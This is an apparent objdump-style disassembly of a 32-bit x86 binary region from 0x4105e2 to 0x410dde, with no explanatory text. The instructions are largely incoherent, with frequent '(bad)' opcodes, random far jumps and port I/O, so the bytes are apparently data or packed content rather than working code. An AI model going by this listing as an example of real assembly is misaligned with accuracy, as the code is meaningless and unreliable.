  4105e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105e3:	shl    DWORD PTR [edx+0x55],cl
  4105e6:	add    bl,BYTE PTR [esp+ebx*4+0x94585f7]
  4105ed:	nop
  4105ee:	inc    eax
  4105ef:	jle    0x410607
  4105f1:	and    al,BYTE PTR [ecx+0x36]
  4105f4:	mov    ds:0x2b73866,eax
  4105f9:	mov    al,BYTE PTR [edi+0x18c4bc26]
  4105ff:	dec    esp
  410600:	int    0x29
  410602:	(bad)  
  410603:	into   
  410604:	push   eax
  410605:	xlat   BYTE PTR ds:[ebx]
  410606:	or     ebp,DWORD PTR [ebx+0x62ec0dc9]
  41060c:	fnsave ds:[edi]
  41060f:	ret    
  410610:	or     al,0x2a
  410612:	sahf   
  410613:	call   0xb1fa4f2a
  410618:	jg     0x410605
  41061a:	sahf   
  41061b:	pop    ebx
  41061c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41061d:	jp     0x4105dc
  41061f:	mov    DWORD PTR [ebx+ebx*2+0x31],esp
  410623:	mov    dl,0x4a
  410625:	pop    esi
  410626:	test   al,0xbc
  410628:	xchg   ecx,eax
  410629:	inc    edx
  41062a:	jmp    0xd788a381
  41062f:	jmp    0xb6beb6ea
  410634:	adc    eax,0x47d87ea9
  410639:	(bad)  
  41063a:	sub    ah,dh
  41063c:	jmp    0x14a9:0xab6f546f
  410643:	out    dx,eax
  410644:	loope  0x410659
  410646:	ds adc bh,bl
  410649:	mov    esp,0xd63c69b1
  41064e:	push   esp
  41064f:	rcl    cl,0x25
  410652:	enter  0xbb27,0x21
  410656:	and    BYTE PTR [edx],cl
  410658:	aaa    
  410659:	cli    
  41065a:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41065c:	repz retf 0xddba
  410660:	mov    ah,0xa1
  410662:	mov    ecx,ecx
  410664:	in     eax,0xe9
  410666:	inc    ebx
  410667:	xchg   esi,eax
  410668:	out    dx,al
  410669:	jne    0x41064e
  41066b:	sbb    al,0x45
  41066d:	push   edx
  41066e:	sar    edx,0xb1
  410671:	xor    BYTE PTR [esi+ebx*1+0x6c11b4f5],ch
  410678:	push   esi
  410679:	cdq    
  41067a:	hlt    
  41067b:	push   esp
  41067c:	mov    ecx,0xc8737f1a
  410681:	test   BYTE PTR [edi+esi*1],bl
  410684:	mul    edi
  410686:	stc    
  410687:	mov    dh,0xab
  410689:	imul   edx,ebx,0x7734ffaf
  41068f:	dec    esi
  410690:	fcomp  QWORD PTR [esi+0x5f97d5af]
  410696:	aad    0x8
  410698:	mov    ecx,ebp
  41069a:	loopne 0x410658
  41069c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41069d:	and    eax,0x59a2ce33
  4106a2:	inc    ecx
  4106a3:	and    al,0xaa
  4106a5:	sub    ebp,DWORD PTR [ecx]
  4106a7:	sub    edi,DWORD PTR [eax-0xd62a26]
  4106ad:	dec    ecx
  4106ae:	mov    bh,0xeb
  4106b0:	in     al,0x64
  4106b2:	aam    0x98
  4106b4:	push   cs
  4106b5:	mov    ds:0x7cdb7286,eax
  4106ba:	(bad)  
  4106bb:	scas   eax,DWORD PTR es:[edi]
  4106bc:	cwde   
  4106bd:	sbb    BYTE PTR [ebp-0x5849f714],cl
  4106c3:	ins    BYTE PTR es:[edi],dx
  4106c4:	pop    ebx
  4106c5:	mov    dl,0xce
  4106c7:	jae    0x410718
  4106c9:	call   0xa694:0x6cb8a510
  4106d0:	sar    BYTE PTR gs:[ebx+0x1e],0x3
  4106d5:	xchg   edi,eax
  4106d6:	add    BYTE PTR [eax-0x528d713d],dl
  4106dc:	je     0x41068a
  4106de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4106df:	cmp    al,0x87
  4106e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106e2:	stos   DWORD PTR es:[edi],eax
  4106e3:	jne    0x410688
  4106e5:	sub    eax,DWORD PTR [edx]
  4106e7:	xbegin 0x469ebbcd
  4106ed:	xor    BYTE PTR [edx],dl
  4106ef:	mov    al,ds:0x2ad848a7
  4106f4:	xchg   BYTE PTR [edx+edi*1],dh
  4106f7:	xchg   esp,eax
  4106f8:	dec    edx
  4106f9:	mov    esp,DWORD PTR [edx+0x4a]
  4106fc:	mov    ds:0x35048a3f,al
  410701:	jne    0x410743
  410703:	imul   edi,DWORD PTR [esp+ebp*1+0x48],0x1b336fa7
  41070b:	xor    dh,al
  41070d:	sub    BYTE PTR ds:0x12ccee86,bh
  410713:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410714:	inc    eax
  410715:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410716:	lods   eax,DWORD PTR ds:[esi]
  410717:	pop    ss
  410718:	outs   dx,DWORD PTR ds:[esi]
  410719:	fidiv  WORD PTR [edx+eax*8-0x22]
  41071d:	jnp    0x410741
  41071f:	out    0x97,eax
  410721:	or     al,0x85
  410723:	les    ecx,FWORD PTR [edx-0x3]
  410726:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410727:	jns    0x41075b
  410729:	mov    esi,0xa7a2d1cf
  41072e:	test   al,0x9d
  410730:	out    0xa9,al
  410732:	sub    bh,BYTE PTR [ebx+0x43]
  410735:	nop
  410736:	stc    
  410737:	pop    esp
  410738:	(bad)  
  410739:	xchg   ebx,eax
  41073a:	(bad)  
  41073b:	shl    al,1
  41073d:	jg     0x41074a
  41073f:	xchg   ecx,eax
  410740:	cmp    BYTE PTR gs:[ebp+0x2a],al
  410744:	push   esi
  410745:	xor    ebp,DWORD PTR [edi+0x8]
  410748:	cli    
  410749:	retf   0x6547
  41074c:	or     ecx,edi
  41074e:	inc    ebx
  41074f:	mov    BYTE PTR [edx],ah
  410751:	and    BYTE PTR [ebx],bl
  410753:	stos   BYTE PTR es:[edi],al
  410754:	jg     0x4107ce
  410756:	enter  0xc686,0x6f
  41075a:	pop    ss
  41075b:	pop    ebp
  41075c:	pusha  
  41075d:	loopne 0x4106e2
  41075f:	pop    esi
  410760:	cli    
  410761:	push   0x7c44bdef
  410766:	(bad)  
  410767:	stos   BYTE PTR es:[edi],al
  410768:	jae    0x4107ab
  41076a:	dec    ecx
  41076b:	pop    ds
  41076c:	dec    ecx
  41076d:	sub    DWORD PTR [ebx+0x2],esp
  410770:	adc    eax,0x54e2a0f
  410775:	into   
  410776:	bound  ecx,QWORD PTR [ebp+ecx*1+0x3d]
  41077a:	sti    
  41077b:	push   ebx
  41077c:	and    esi,esi
  41077e:	mov    ds:0x5264e77,al
  410783:	jno    0x410773
  410785:	xchg   edi,eax
  410786:	sti    
  410787:	out    dx,eax
  410788:	ret    
  410789:	aam    0xf2
  41078b:	cmp    ecx,edx
  41078d:	(bad)  
  41078e:	call   0x3ced:0x31b187f1
  410795:	outs   dx,BYTE PTR ds:[esi]
  410796:	add    ebx,DWORD PTR [esi-0x7d74636a]
  41079c:	inc    ebx
  41079d:	stos   DWORD PTR es:[edi],eax
  41079e:	dec    ebp
  41079f:	mov    BYTE PTR [esi-0x2a],ah
  4107a2:	sub    bh,dh
  4107a4:	xor    DWORD PTR [ebx-0x6e],ecx
  4107a7:	dec    edi
  4107a8:	mov    BYTE PTR [edx],bl
  4107aa:	or     al,ah
  4107ac:	or     eax,0xdfc485a4
  4107b1:	push   ss
  4107b2:	xchg   BYTE PTR ds:0x40b92d64,bh
  4107b8:	call   0xea32deb3
  4107bd:	mov    BYTE PTR [esi-0x695e9fd9],bl
  4107c3:	inc    ebp
  4107c4:	mov    ebx,0x5f169a9e
  4107c9:	xchg   BYTE PTR [edx+edi*4-0x6d],cl
  4107cd:	push   cs
  4107ce:	popf   
  4107cf:	push   0xffffffd5
  4107d1:	sbb    eax,0x94116819
  4107d6:	out    dx,eax
  4107d7:	and    DWORD PTR [ebp+0x57],esi
  4107da:	pop    ebp
  4107db:	jae    0x410772
  4107dd:	(bad)  
  4107de:	pop    ss
  4107df:	inc    ebx
  4107e0:	add    DWORD PTR [esi-0x4f],0x6d1b4c96
  4107e7:	das    
  4107e8:	mov    ds:0xdab69d01,al
  4107ed:	dec    BYTE PTR [eax+0x72]
  4107f0:	push   cx
  4107f2:	sti    
  4107f3:	stos   BYTE PTR es:[edi],al
  4107f4:	in     al,dx
  4107f5:	xchg   esp,eax
  4107f6:	mov    eax,0xc4f2a2a1
  4107fb:	ss mov ecx,0xb43ae002
  410801:	stos   DWORD PTR es:[edi],eax
  410802:	cmp    al,0x21
  410804:	xchg   edi,eax
  410805:	add    DWORD PTR [edi+0x54d70b15],edi
  41080b:	subps  xmm7,xmm2
  41080e:	jl     0x4107bc
  410810:	ja     0x4107a2
  410812:	(bad)  
  410813:	out    dx,al
  410814:	(bad)  
  410815:	fidiv  WORD PTR [esi-0x6a]
  410818:	aas    
  410819:	(bad)  
  41081a:	mov    ecx,0xe7b6fc1e
  41081f:	retf   
  410820:	pop    ebx
  410821:	xor    DWORD PTR [ecx+0x2d],ecx
  410824:	test   esi,0x61062396
  41082a:	mov    bh,BYTE PTR [ebx]
  41082c:	out    dx,al
  41082d:	in     eax,0x3e
  41082f:	sbb    eax,0x64c64ccb
  410834:	test   BYTE PTR [ebx+0x4a],dh
  410837:	dec    ecx
  410838:	xor    al,0x20
  41083a:	push   ds
  41083b:	sbb    ebp,ebp
  41083d:	jmp    0x966f:0xeafcbfdd
  410844:	shl    DWORD PTR [esi+ecx*4-0x5c],0x25
  410849:	xchg   ebp,eax
  41084a:	mov    edi,0xbae90a9b
  41084f:	ins    DWORD PTR es:[edi],dx
  410850:	repnz or edi,DWORD PTR [ebx+ebp*1-0x5ad46876]
  410858:	jb     0x410883
  41085a:	adc    DWORD PTR [ebx-0x1c],eax
  41085d:	clc    
  41085e:	jge    0x4108b2
  410860:	mov    ebp,0xb38b5625
  410865:	mov    DWORD PTR [ebx],esi
  410867:	inc    edi
  410868:	dec    ebx
  410869:	lea    edi,ds:0x62a48f55
  41086f:	mov    ecx,DWORD PTR [edx+0x214f6da7]
  410875:	scas   al,BYTE PTR es:[edi]
  410876:	jmp    0x3a564937
  41087b:	add    al,0xf2
  41087d:	outs   dx,DWORD PTR ds:[esi]
  41087e:	call   0xf12d202b
  410883:	pop    eax
  410884:	(bad)  
  410885:	arpl   WORD PTR [ecx-0x392faabe],cx
  41088b:	mov    BYTE PTR [ebx-0x6e488afa],bh
  410891:	(bad)  [ebx+edx*2+0x3f9fbafe]
  410898:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410899:	adc    ah,BYTE PTR [ecx]
  41089b:	bound  ebx,QWORD PTR [esi-0x77]
  41089e:	sahf   
  41089f:	cmp    al,0x97
  4108a1:	xchg   esp,eax
  4108a2:	xchg   DWORD PTR [ecx+0x23],ecx
  4108a5:	jecxz  0x4108b9
  4108a7:	pop    edi
  4108a8:	mov    DWORD PTR [esi],ebp
  4108aa:	cmp    eax,0x98a30f3c
  4108af:	ds in  eax,dx
  4108b1:	imul   edi,DWORD PTR [esi-0x4741dc65],0xffffff8d
  4108b8:	cld    
  4108b9:	daa    
  4108ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108bb:	in     al,0xca
  4108bd:	xchg   edx,eax
  4108be:	inc    ebx
  4108bf:	inc    eax
  4108c0:	xchg   edx,eax
  4108c1:	sbb    ecx,DWORD PTR [eax+0x5b]
  4108c4:	fsub   QWORD PTR [esi+0x6d]
  4108c7:	mov    esp,DWORD PTR [edx+0x7f]
  4108ca:	cwde   
  4108cb:	sbb    DWORD PTR [ebp-0xe77ee8c],esp
  4108d1:	cmp    DWORD PTR [ebp-0x566f548a],edi
  4108d7:	inc    edi
  4108d8:	or     dh,BYTE PTR [esi]
  4108da:	mov    edi,0x6b3bd09a
  4108df:	inc    ecx
  4108e0:	add    eax,0xe08c1bdc
  4108e5:	lea    eax,[ebx+esi*1-0x22]
  4108e9:	out    dx,al
  4108ea:	or     esi,ebp
  4108ec:	jmp    0xa80ebeea
  4108f1:	dec    ecx
  4108f2:	js     0x410925
  4108f4:	add    ch,bh
  4108f6:	out    dx,al
  4108f7:	mov    dh,0x2a
  4108f9:	pop    DWORD PTR [eax-0x27]
  4108fc:	arpl   bx,bx
  4108fe:	ins    BYTE PTR es:[edi],dx
  4108ff:	jmp    0x4108ad
  410901:	jmp    0x410890
  410903:	pop    ebp
  410904:	lds    eax,FWORD PTR [edi]
  410906:	dec    esi
  410907:	adc    cl,dl
  410909:	fldenv [eax+0x766420dc]
  41090f:	icebp  
  410910:	xchg   esi,eax
  410911:	fidiv  WORD PTR [esp+ecx*8+0x25797fb6]
  410918:	ss call 0xfd0d:0xa8941a38
  410920:	mov    ebx,0x4bf10c1b
  410925:	jl     0x4109a5
  410927:	pop    ebp
  410928:	jnp    0x41099b
  41092a:	jb     0x41097e
  41092c:	inc    esi
  41092d:	out    0x92,eax
  41092f:	ins    BYTE PTR es:[edi],dx
  410930:	mov    DWORD PTR [edi-0x6a],ebx
  410933:	std    
  410934:	int3   
  410935:	mov    dl,0x44
  410937:	lock xor edx,DWORD PTR [edi+ebp*2+0x30]
  41093c:	sub    BYTE PTR [ecx],dh
  41093e:	fs adc eax,0x8a7f4e05
  410944:	lss    ebx,FWORD PTR [ebx-0x78]
  410948:	sbb    al,0x86
  41094a:	int3   
  41094b:	add    ah,BYTE PTR [esi]
  41094d:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41094f:	xchg   ecx,eax
  410950:	inc    eax
  410951:	jecxz  0x4108e3
  410953:	loope  0x410964
  410955:	push   es
  410956:	dec    eax
  410957:	fnsave [ecx+edi*4]
  41095a:	adc    edx,esp
  41095c:	mov    ch,0x32
  41095e:	pop    es
  41095f:	sub    al,0x6d
  410961:	repnz push edx
  410963:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410964:	jge    0x4109ab
  410966:	mov    fs,WORD PTR [edx+0x45]
  410969:	mov    DWORD PTR [edi+edi*1+0x3b],ebx
  41096d:	and    DWORD PTR [ecx-0x32d8983e],ebx
  410973:	adc    bl,0x2a
  410976:	jne    0x4109eb
  410978:	xchg   DWORD PTR [ecx-0x1e],edx
  41097b:	jg     0x41095c
  41097d:	int    0xa9
  41097f:	sbb    eax,0x5f78874c
  410984:	in     al,0xab
  410986:	iret   
  410987:	fmul   DWORD PTR [edi+0x51]
  41098a:	stc    
  41098b:	lods   eax,DWORD PTR ds:[esi]
  41098c:	andps  xmm2,XMMWORD PTR [esi+eax*4]
  410990:	aaa    
  410991:	pop    ebp
  410992:	ds dec ebp
  410994:	or     al,0xfe
  410996:	sub    DWORD PTR [ebp-0x7e],esp
  410999:	daa    
  41099a:	ftst   
  41099c:	lods   al,BYTE PTR ds:[esi]
  41099d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41099e:	add    bl,BYTE PTR [ecx*1-0x7d662de4]
  4109a5:	push   ecx
  4109a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109a7:	adc    al,0xb
  4109a9:	ds sahf 
  4109ab:	jno    0x410a09
  4109ad:	adc    dh,0xf6
  4109b0:	(bad)  
  4109b1:	dec    ebx
  4109b2:	cmp    BYTE PTR ds:0xba276404,ah
  4109b8:	out    0x80,al
  4109ba:	jo     0x4109d4
  4109bc:	mov    ds:0xd8ccb567,eax
  4109c1:	push   edi
  4109c2:	in     eax,0xd
  4109c4:	push   edx
  4109c5:	mov    ebx,0x4970cf31
  4109ca:	out    0xcb,eax
  4109cc:	sub    BYTE PTR [ecx],bh
  4109ce:	mov    gs,WORD PTR [edi-0x4018adf8]
  4109d4:	pop    ebx
  4109d5:	sbb    edx,ebx
  4109d7:	rol    DWORD PTR [edi+edx*2+0x2b071cb3],0x96
  4109df:	(bad)  
  4109e1:	mov    ch,0x1b
  4109e3:	cli    
  4109e4:	ins    DWORD PTR es:[edi],dx
  4109e5:	std    
  4109e6:	add    DWORD PTR [edi],ebx
  4109e8:	shr    BYTE PTR [edi-0x18],1
  4109eb:	sti    
  4109ec:	jb     0x410990
  4109ee:	repz push edi
  4109f0:	adc    BYTE PTR [ebx-0x5ce97b66],bh
  4109f6:	mov    ds:0x7c6858e8,al
  4109fb:	into   
  4109fc:	add    bh,BYTE PTR [esi+0x6e472a8a]
  410a02:	ret    0x33c0
  410a05:	adc    BYTE PTR [edi+0x6f],ah
  410a08:	mov    cl,bh
  410a0a:	es loope 0x4109d5
  410a0d:	lahf   
  410a0e:	test   eax,0xba5acde6
  410a13:	or     eax,0xac2f9277
  410a18:	jl     0x410a74
  410a1a:	jge    0x410a7b
  410a1c:	inc    edx
  410a1d:	push   eax
  410a1e:	ja     0x410a80
  410a20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a21:	dec    ecx
  410a22:	jmp    0xcb488e10
  410a27:	sbb    esp,ebp
  410a29:	inc    edx
  410a2a:	sbb    eax,0xdc41f1f4
  410a2f:	sar    BYTE PTR [ecx+0x74],1
  410a32:	repz cdq 
  410a34:	pushf  
  410a35:	stos   DWORD PTR es:[edi],eax
  410a36:	push   ecx
  410a37:	jo     0x4109f9
  410a39:	mov    bl,0xd1
  410a3b:	(bad)  
  410a3c:	dec    ebx
  410a3d:	mov    eax,ds:0xe9ec7f4c
  410a42:	out    dx,al
  410a43:	mov    bl,0xb7
  410a45:	mov    esi,0x35868144
  410a4a:	in     al,0x9a
  410a4c:	fdivr  QWORD PTR [ecx-0x6d2ecc1b]
  410a52:	dec    ebp
  410a53:	lahf   
  410a54:	shr    ecx,1
  410a56:	push   es
  410a57:	sub    eax,ecx
  410a59:	mov    edx,0xada75782
  410a5e:	adc    eax,DWORD PTR [eax]
  410a60:	push   edi
  410a61:	mov    esi,0x17735035
  410a66:	cmp    ecx,DWORD PTR ss:[eax+0x57]
  410a6a:	push   0xd
  410a6c:	xchg   esp,eax
  410a6d:	pop    ebx
  410a6e:	mov    bl,0x1b
  410a70:	imul   eax,DWORD PTR [edx],0xffffffd1
  410a73:	retf   0x69bb
  410a76:	shl    DWORD PTR [esi-0x18],cl
  410a79:	pusha  
  410a7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a7b:	out    0x58,al
  410a7d:	lock (bad) 
  410a7f:	xchg   ebx,eax
  410a80:	das    
  410a81:	inc    eax
  410a82:	inc    ecx
  410a83:	in     al,dx
  410a84:	leave  
  410a85:	xor    BYTE PTR [ebx+0x7c],al
  410a88:	inc    esp
  410a89:	adc    ecx,esi
  410a8b:	ja     0x410af0
  410a8d:	jae    0x410adb
  410a8f:	mov    ecx,0x356a90c6
  410a94:	pop    ebp
  410a95:	adc    ch,BYTE PTR [edx+0x79edbe0]
  410a9b:	cmp    dl,BYTE PTR [esi+0x41201984]
  410aa1:	mov    ds,ebx
  410aa3:	add    al,ch
  410aa5:	stos   BYTE PTR es:[edi],al
  410aa6:	enter  0x6b16,0x11
  410aaa:	push   edx
  410aab:	(bad)  
  410aac:	hlt    
  410aad:	pop    ebp
  410aae:	inc    ebx
  410aaf:	add    eax,0xf9272a72
  410ab4:	xchg   edx,eax
  410ab5:	adc    DWORD PTR [edi-0x4a],0xacff991a
  410abc:	adc    eax,0xf1afcdfc
  410ac1:	mov    eax,0xf7ccee7
  410ac6:	sub    ebx,DWORD PTR [esi+0x11]
  410ac9:	sbb    al,0xea
  410acb:	retf   
  410acc:	cmp    al,0x9d
  410ace:	jmp    0x48fe:0xc6fd8078
  410ad5:	push   0x57302287
  410ada:	ja     0x410b26
  410adc:	nop
  410add:	add    WORD PTR [esp+edi*2+0x29],sp
  410ae2:	ins    DWORD PTR es:[edi],dx
  410ae3:	stos   DWORD PTR es:[edi],eax
  410ae4:	int    0xee
  410ae6:	and    al,0xc1
  410ae8:	pop    ds
  410ae9:	jl     0x410a8e
  410aeb:	hlt    
  410aec:	aas    
  410aed:	adc    dh,dh
  410aef:	inc    esp
  410af0:	cmc    
  410af1:	ja     0x410b39
  410af3:	test   DWORD PTR [edx-0x44],0x53201e11
  410afa:	jnp    0x410ab1
  410afc:	and    DWORD PTR [ecx],0xd3032f9d
  410b02:	outs   dx,BYTE PTR ds:[esi]
  410b03:	sub    esi,DWORD PTR [edi+eiz*2]
  410b06:	or     ch,0xe
  410b09:	add    al,0x6d
  410b0b:	popa   
  410b0c:	mov    cs,WORD PTR [esi]
  410b0e:	int3   
  410b0f:	arpl   WORD PTR [ebp-0x248e6dd8],ax
  410b15:	loope  0x410b08
  410b17:	lea    ebx,[eax+0x40ddd15e]
  410b1d:	aam    0x85
  410b1f:	push   edx
  410b20:	fs das 
  410b22:	xchg   esp,esp
  410b24:	mov    bl,0xbc
  410b26:	data16 syscall 
  410b29:	(bad)  
  410b2a:	jno    0x410ba3
  410b2c:	mov    dl,0xee
  410b2e:	mov    ds:0x7330cb74,eax
  410b33:	dec    esp
  410b34:	xchg   edx,eax
  410b35:	stos   BYTE PTR es:[edi],al
  410b36:	sar    ecx,cl
  410b38:	mov    ecx,0x85e82d79
  410b3d:	xchg   ebp,eax
  410b3e:	sub    eax,0xbe8b3aca
  410b43:	shr    BYTE PTR [esp+ecx*2],1
  410b46:	(bad)  
  410b47:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  410b49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b4a:	ret    
  410b4b:	push   ecx
  410b4c:	loop   0x410b2a
  410b4e:	inc    edx
  410b4f:	and    DWORD PTR [ebx+0x2c],edx
  410b52:	adc    dl,BYTE PTR [eax+0x64]
  410b55:	mov    ch,0x22
  410b57:	mov    ch,bh
  410b59:	ss js  0x410ae7
  410b5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b5d:	test   BYTE PTR [ebp+0x86e8605],dh
  410b63:	cs call 0xfa7c:0xd8022a28
  410b6b:	sbb    edx,DWORD PTR [ecx-0x1]
  410b6e:	push   esi
  410b6f:	shr    bh,0x9f
  410b72:	hlt    
  410b73:	or     eax,0xe9700705
  410b78:	ins    BYTE PTR es:[edi],dx
  410b79:	push   ss
  410b7a:	sar    esi,cl
  410b7c:	lds    ebx,FWORD PTR [ecx+0x6f]
  410b7f:	xor    al,0x6a
  410b81:	test   BYTE PTR [edx-0x45],0xa1
  410b85:	popa   
  410b86:	adc    cl,BYTE PTR [esi-0x35fbb627]
  410b8c:	popa   
  410b8d:	sbb    esp,DWORD PTR [eax]
  410b8f:	push   0xbfb4ef53
  410b94:	add    DWORD PTR [edx+0x63],ebx
  410b97:	mov    eax,ds:0x2835bbf8
  410b9c:	mov    ds:0xb892890b,al
  410ba1:	es cdq 
  410ba3:	mov    al,0x45
  410ba5:	test   al,0x18
  410ba7:	arpl   WORD PTR [ecx+0x31],sp
  410baa:	jle    0x410bf8
  410bac:	jno    0x410b5d
  410bae:	lock test BYTE PTR [edx],bh
  410bb1:	xchg   ecx,eax
  410bb2:	jmp    0x410bf6
  410bb4:	leave  
  410bb5:	loop   0x410bed
  410bb7:	and    DWORD PTR [esi],eax
  410bb9:	jnp    0x410b41
  410bbb:	mov    ds:0x7ed6781c,al
  410bc0:	push   0xffffffe2
  410bc2:	sub    ebx,edi
  410bc4:	cmp    eax,0x808f371a
  410bc9:	dec    edi
  410bca:	div    BYTE PTR [ebp+0x55]
  410bcd:	popf   
  410bce:	bound  ecx,QWORD PTR [ebx-0x5b0287ce]
  410bd4:	dec    eax
  410bd5:	mov    ebp,0xb2c421bd
  410bda:	inc    ebx
  410bdb:	scas   eax,DWORD PTR es:[edi]
  410bdc:	retf   
  410bdd:	mov    ah,0xce
  410bdf:	scas   eax,DWORD PTR es:[edi]
  410be0:	stc    
  410be1:	js     0x410b69
  410be3:	fisttp WORD PTR [edi-0x17031c49]
  410be9:	jl     0x410c59
  410beb:	jmp    0xe75ccee6
  410bf0:	lods   al,BYTE PTR ds:[esi]
  410bf1:	mov    edx,0x22b309cb
  410bf6:	iret   
  410bf7:	xor    eax,0xf92aaeab
  410bfc:	mov    dh,0xa2
  410bfe:	mov    ah,0x15
  410c00:	sbb    DWORD PTR [edi+0x646db3ec],edi
  410c06:	fistp  QWORD PTR [ecx+0x21]
  410c09:	adc    BYTE PTR [esi+ecx*1+0x24],0x49
  410c0e:	jmp    0x410bf2
  410c10:	or     al,0x40
  410c12:	bound  ecx,QWORD PTR [ebx+0x31]
  410c15:	outs   dx,DWORD PTR ds:[esi]
  410c16:	and    edx,DWORD PTR [ebx-0x61ad3b96]
  410c1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c1d:	(bad)  
  410c1e:	nop
  410c1f:	inc    esi
  410c20:	int3   
  410c21:	outs   dx,DWORD PTR ds:[esi]
  410c22:	jne    0x410c81
  410c24:	pop    ss
  410c25:	sub    BYTE PTR [ebp+0x1193321f],0x71
  410c2c:	outs   dx,BYTE PTR ds:[esi]
  410c2d:	mov    dl,0x6d
  410c2f:	mov    dl,0x9e
  410c31:	and    al,0x45
  410c33:	push   edi
  410c34:	add    BYTE PTR cs:[edx],ch
  410c37:	sbb    ebp,DWORD PTR [eax+0x4d]
  410c3a:	hlt    
  410c3b:	inc    esi
  410c3c:	xchg   ebx,eax
  410c3d:	shr    BYTE PTR [ecx],0x9f
  410c40:	mov    WORD PTR [ebp+0x7b],?
  410c43:	scas   eax,DWORD PTR es:[edi]
  410c44:	pop    ds
  410c45:	inc    ecx
  410c46:	imul   ebp,DWORD PTR [ecx+0x1d942644],0xe78ac284
  410c50:	aad    0xb4
  410c52:	xchg   esp,eax
  410c53:	popf   
  410c54:	into   
  410c55:	sahf   
  410c56:	mov    dh,0x3d
  410c58:	in     eax,dx
  410c59:	and    al,0x8d
  410c5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c5c:	xor    DWORD PTR [esi+ecx*8-0x19],esp
  410c60:	loope  0x410caa
  410c62:	push   edx
  410c63:	cmp    al,0xad
  410c65:	sub    esi,DWORD PTR [edx-0xd]
  410c68:	int3   
  410c69:	mov    esp,0xfdacae34
  410c6e:	mov    DWORD PTR [ecx-0x3],edx
  410c71:	dec    ebx
  410c72:	cmp    bh,BYTE PTR [ebx-0x79141572]
  410c78:	in     al,0xa2
  410c7a:	inc    ebp
  410c7b:	daa    
  410c7c:	pop    es
  410c7d:	mov    DWORD PTR [esi-0x67f67a1b],edi
  410c83:	ret    0x430f
  410c86:	dec    ebp
  410c87:	das    
  410c88:	out    0xed,al
  410c8a:	mov    BYTE PTR [esi+0xc3aa8fe],0xe8
  410c91:	and    eax,0x3148dd
	...
  410d12:	add    BYTE PTR [eax],al
  410d14:	mov    ecx,0xbfb9b684
  410d19:	mov    ebx,0xac284bf
  410d1e:	mov    ebp,DWORD PTR [edx+0x2f]
  410d21:	dec    edi
  410d22:	jb     0x410d79
  410d24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d25:	mov    bh,0x0
  410d27:	add    BYTE PTR [ecx+0x7],ch
  410d2a:	add    BYTE PTR [eax],al
  410d2c:	adc    dh,BYTE PTR [ebx-0x6b]
  410d2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d30:	scas   al,BYTE PTR es:[di]
  410d32:	mov    eax,ds:0x997c8408
  410d37:	pop    ebp
  410d38:	push   ebx
  410d39:	xor    dl,BYTE PTR [edi+0x25]
  410d3c:	jno    0x410d15
  410d3e:	mov    esp,0xdbbb6454
  410d43:	mov    eax,ds:0xd906995f
  410d48:	jmp    0x410d37
  410d4a:	out    dx,al
  410d4b:	mov    ecx,0x9ff31b10
  410d50:	push   eax
  410d51:	icebp  
  410d52:	or     al,0x1a
  410d54:	das    
  410d55:	fistp  WORD PTR [edi]
  410d57:	ret    
  410d58:	iret   
  410d59:	aaa    
  410d5a:	dec    ecx
  410d5b:	adc    ecx,DWORD PTR [ebx-0x4192f10d]
  410d61:	scas   eax,DWORD PTR es:[edi]
  410d62:	rcr    DWORD PTR [edx+0x541f16c9],cl
  410d68:	and    ch,BYTE PTR [esi]
  410d6a:	mov    DWORD PTR fs:[esi-0x4888b1b2],ecx
  410d71:	add    cl,dh
  410d73:	(bad)
  410d78:	call   0x323c2acd
  410d7d:	xchg   edi,eax
  410d7e:	dec    eax
  410d7f:	inc    ebx
  410d80:	lds    ebx,FWORD PTR [edx]
  410d82:	xor    BYTE PTR [esi+0x1d],ch
  410d85:	pop    ds
  410d86:	mov    ds:0xf3ad93cb,eax
  410d8b:	stc    
  410d8c:	adc    BYTE PTR [esi+0x60],bh
  410d8f:	push   es
  410d90:	add    ebp,DWORD PTR ds:0xfebde678
  410d96:	je     0x410d86
  410d98:	and    eax,0x297eb924
  410d9d:	mov    cl,0x2
  410d9f:	mov    edx,0x52e296b1
  410da4:	ret    
  410da5:	push   cs
  410da6:	cmp    BYTE PTR [esp+esi*8],0x91
  410daa:	xor    ebx,DWORD PTR [ebx+0x47]
  410dad:	push   ecx
  410dae:	loop   0x410e20
  410db0:	push   edi
  410db1:	idiv   ecx
  410db3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410db4:	retf   
  410db5:	push   ebx
  410db6:	pop    eax
  410db7:	in     al,0x6f
  410db9:	jecxz  0x410de2
  410dbb:	push   ss
  410dbc:	lahf   
  410dbd:	inc    ebx
  410dbe:	aas    
  410dbf:	test   DWORD PTR [ebp-0x10953da7],esp
  410dc5:	mov    edx,0xbd12f32c
  410dca:	inc    eax
  410dcb:	lss    edi,FWORD PTR [esi-0x1e]
  410dcf:	mov    ah,0xdc
  410dd1:	jg     0x410dcd
  410dd3:	fsubp  st(3),st
  410dd5:	xor    DWORD PTR [edx+0x3cd40e1c],esp
  410ddb:	daa    
  410ddc:	jae    0x410d6d
  410dde:	or     bl,BYTE PTR [ecx-0x6c]
